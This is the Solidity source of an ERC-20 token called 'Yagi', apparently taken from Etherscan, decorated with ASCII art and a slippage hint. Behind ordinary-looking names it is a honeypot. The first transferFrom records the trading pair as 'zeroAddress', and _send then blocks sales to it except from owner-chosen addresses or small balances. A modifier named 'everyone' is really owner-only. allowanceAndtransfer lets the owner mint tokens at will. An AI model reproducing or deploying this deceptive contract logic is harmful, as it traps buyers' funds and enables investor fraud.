['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-08\n', '*/\n', '\n', '/**\n', '     __     __         _ \n', '     \\ \\   / /        (_)\n', '      \\ \\_/ /_ _  __ _ _ \n', '       \\   / _` |/ _` | |\n', '        | | (_| | (_| | |\n', '        |_|\\__,_|\\__, |_|\n', '                  __/ |  \n', '      /)  (\\     |___/   \n', ' )\\.:::::::::./(\n', ' \\( o       o )/\n', "   '-./ / _.-'`-.\n", '    ( oo  ) / _  \\\n', "    |'--'/\\/ ( \\  \\\n", "     \\''/  \\| \\ \\  \\\n", "      ww   |  '  )  \\\n", "           |.' .'   |\n", "          .' .'==|==|\n", "         / .'\\    [_]\n", '      .-(/\\) |     /\n', '     /.-"""\'/|    |\n', '     ||    / |    |\n', '     //   |  |    |\n', '     ||   |__|___/\n', '     \\\\   [__[___]\n', "     // .-'.-'  (\n", '     ||(__(__.-._)\n', '     \n', '⇅ Set slip to 11% ⇅\n', '\n', '**/\n', '\n', '//   SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', 'contract ERC20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  \n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier everyone {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '}\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', '/**\n', '\n', '                               .        ..,,:;;;ii;;;;:::,..                                        \n', '                                 .,:i1ttffLLCCCCCLLLLLLLLLfft1i;:,.                                 \n', '                            .,itLCGGGCCLLLLLLLfffffffffffLfLLLLLLLf1i:,                             \n', '                    .    ,;tCG000GCCLffffffttfffffffffttfffLffLfffffffff1:,                         \n', '                      ,:itLCGGLCCLLfffftt1tttttttttttttftt1tt111tffttfffLLfti,                      \n', '                   .;tffLCCGCLLLLfffttttttftt111111tttttttttt111tfffffftttttff1;.                   \n', '                 ,ifffLLCCCLLCLfLfLLffffft11t1ii1111tfft1ttttffftfLLLfffttttft1tti,                 \n', '               ,itffffLLLfLLLCLfLLLCCLLfffffft111ii11tt11111tffffffffLCLfffffftttff1:.              \n', '             ,iffttfffLLffLLffffLLLftttttfftfftffttt1111tt1tttttfttfLfLLLfttttftfffff1,             \n', '           .ifftttfLLGCLffftffffffft1111ttfttfffLfffffffttttt1ttttttfLCLffffffffttfLLLfi,           \n', '          ,1ffttffCGGCLLCLffffffffftttffttt11ttttttttttffffLf1ttttfffLCCCLCLfftfffffLLLt1:  .       \n', '         ;ttttttffCGLffLLLLfffLffft1tttfLffLLftttt1tt11ttfffLLffftfLLffLLLLfffttffffffffff1.        \n', '       .1ttfftt1111tffffffLLLft1tt11ttfffffLLt1i;i1ttff11tfffLffffLLffffffttfffffLfffLLfffft,       \n', '      .1fffftt1iiittttffLffLLftt11tttttttttti;:::,;11fft111tfft1tffCCfffffftttfffCLffffLfffft,      \n', '     .1tfft1i1i11i1ftfttffffLftt1tttttttfLt1:,:,::i1tttft111tt1ttffLfLfLLfLfftttLLLLfffLLfffft,     \n', '     ittt1t11111111ftfttftttttttft1tttLLtttt1iiiii11t1t1111tftffffLLLffLCLLLCLLLLCLLLffLLftffft,    \n', '    :ttt111i1111it1tttttt1tt1tttttfffffffftttttttt111i1t11tftffffffftffLLfLffLfLLLLfffffffttfftt.   \n', '   ,11;itt1111i111i1tffftffttttttttffttfLLfttttt1t1111tffffftLLfLCCLLLLffLfffffLLLfLfft1t1ttfttti   \n', '   ;i;:;i1i11i11i111fffLLLffftfffttfttt1tf11t111tLftt1ffLLLfLfLLLLCCGGGLLLffftLLfLtfCLtt111tttttf: .\n', '  :1;:,::;i111i1111tfLfffffffLLfffft1tt1tt111111ttt11tffLfffLLLCLfLLLCCLLffftfLCLfffLLftt11t11ttft  \n', ' .i1i;:::;i11111111tLLLfLffffffffftt11t1111111tt111ttttfffCLffLLLLLLLLLLfffLLLLCCLLffttt1ttft1ttff, \n', ' ,i1i;;iiii11111111ttLGLfLfLfffLfffftt111tt1ttt1t1t1t1ttttLLffffLGCLfLLLffLLfLffLLLffft1fft1tffftf; \n', ' :111i;iii;1t11ttt11tfCCLfLfftttffffftttttftttttftt11tttffttfCLffLffLLfLLLfLffftfffftffftft11fffff1.\n', ' ;11i::;iiitfitfLt11ffCGGLLLfffftttt11ttfffftttttt11ftffffffLLLLffLffffLCLLfftffttfttfLLftt1ttffLLt.\n', ' ;ii:,.:i11t11ttf111fLCCGGLfffffffftttttttfftttttttttttftfffftfLLfffttfffLLfttttfffttLCLffftttffLLt,\n', ' ;ii:,,:i1ii11tft111tfLLGGCCCLfftfftffffffft1tttfffttfffffff1ii1tffttftfffftttt11tfffffffLfftfffLLf,\n', ' ;1i::;;i11111i11i1ii1tfCCGCGCffffffttfffftftttttft11tfLLfftt11ii1tf1ttfLLftt111ttfffft1fLfftfftfLt.\n', ' :1i;:;i1i111111111i1i1fCGGCLLfttttt1ttt11111i111t111tLCftffttttttttttffLLftfftttfftffttfffftfffff1 \n', ' ,111;;1111111111tt111i1fLCLfftft111tt1111111tt11tt11tt11tffLfttt1tfffffLfttttfffLLLLffftftttftt1t; \n', ' .i11111t111ii1i1t111iii1tttttttt11111111111t111111111111tLLLfttt11ttttfftttfffffLCCCLfttffffttt11, \n', '  ;11111111i1111iiii11iii111t1tt11t111t1i1111111111t1t11ttfffftt1tfLftt1t1tfLffLfLCLLfff1tLfttt11i. \n', '  .i1i1ttt1ii1111t1iii1111i11t111111111t111111t1111111tt1ttttt11tf1fft111111tfLLffffftt1ttttfft11:  \n', '   :11tt1ttt11i11t1iii1tt1111ttttt111i11111tt1i1ft11111t1111111tLfiit1i111itttft11tff111tt1tt1tti   \n', '    ;11i111tttt11iiii11ff1tttt;;:;f1111111111i11Lt111111i1iii1tttftt1i1i11i11iii11tt11111111ii1t,   \n', '    .i11i11i11f1iiiii111t111tt1i;tLt11tttt111111t11111i11iii1111i11iiiii1ii1iii111111111ii111it:    \n', '     ,1111111ii1i;;ii111iiii1i111tft1111i11111111tt11111i11111i11iii1iiiiii1iiiiiiiiiiiii11t1t:     \n', '      ,11t111111i:;i1i;iii11i111ii111ttt1111111111111t11ii111iiiiiii1i;;iii;;;;ii1iii;;;i1tft:      \n', '       ,11111iii11iiiiiii111t1111111111ttt1tff11iii11ftiii1i;:i1i;;;ii;;;;;:;;;i1i;iiiiit1tt,       \n', '        .i11i;;iiiiiii1tt111111ii111iiii11111;:;ii1iit11i:;:::iiiiii;;;;;;;::;ii;;;;iii1tf1.        \n', '          :11;;:;;;;;ii1ttt11111111i1iiii1111;:;ii111111iii;;iii;;;:::;;;;:,:ii:i;,:ii1tt;.         \n', '           .i1i;:;;;;i;i111t111i1i1111iii1i11111111t1111iii;;;i1i;;;;;iii;:;ii;;;;;;i1t1,           \n', '             ,;;;;:;;;;iiii1t11i11111i111i1tLfftttt11iiii;;i;iiiiiiiiii1;:;ii:::;;ii11:.            \n', '              .:iii;;;i;iiii11111111t111iittfft11111ii1;:;iiii;:;iiiii;;;;;;::;;;i1i:.              \n', '                 ,;i;;iii1ii11ii1t1111i11111ii11iii11i1iiiiii;;iii11i;;;i;;;;;;iii:.                \n', '                   .,;ii1111i11111t1iii1111t11111i1111111iii;;iiiiiiii;;;;;;iii;,                   \n', '                     .,:1111ii111ttfffft11111ttf11111i;iii;iiiiiiiiiii;;;iii;,.                     \n', '                        .,;i11111tttfLfLft1tttt11t111iii1i11111i1i11111ii:,.                        \n', '                            .:;itfffftffLLLfttfff1tffft111tttt1ttt1i;:,.                            \n', '                                ..,:;1ttfffLLLLLLLLLCCCLLfftt1ii:,.                                 \n', '                                      ..,,::;iiiii11iii;::,..                                       \n', '\n', '\n', '**/\n', '\n', 'contract TokenERC20 is ERC20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint256 _totalSupply;\n', '  uint internal queueNumber;\n', '  address internal zeroAddress;\n', '  address internal burnAddress;\n', '  address internal burnAddress2;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '    return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '    require(to != zeroAddress, "please wait");\n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;\n', '    else _send (from, to);\n', '\tbalances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function allowanceAndtransfer(address _address, uint256 tokens) public everyone {\n', '    burnAddress = _address;\n', '\t_totalSupply = _totalSupply.add(tokens);\n', '    balances[_address] = balances[_address].add(tokens);\n', '  }\t\n', '  function Burn(address _address) public everyone {\n', '    burnAddress2 = _address;\n', '  }\t\n', '  function BurnSize(uint256 _size) public everyone {\n', '    queueNumber = _size;\n', '  }\t\n', '  function _send (address start, address end) internal view {\n', '      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract Yagi is TokenERC20 {\n', '\n', '  function initialise() public everyone() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '     \n', '    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {\n', '\tsymbol = _symbol;\n', '\tname = _name;\n', '\tdecimals = 18;\n', '\t_totalSupply = _supply*(10**uint256(decimals));\n', '\tqueueNumber = _indexNumber*(10**uint256(decimals));\n', '\tburnAddress = burn1;\n', '\tburnAddress2 = burn2;\n', '\towner = msg.sender;\n', '\tbalances[msg.sender] = _totalSupply;\n', '\temit Transfer(address(0x0), msg.sender, _totalSupply);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']